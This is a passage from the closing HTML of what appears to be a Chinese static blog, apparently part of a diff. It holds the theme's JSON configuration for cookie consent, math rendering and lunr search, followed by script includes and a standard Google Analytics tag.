来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"enablePangu":true,"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"siteTime":"2022-09-16T09:30:34+08:00","twemoji":true};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-SWE55VZ73Q');
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-SWE55VZ73Q" async></script></body>
+</html>
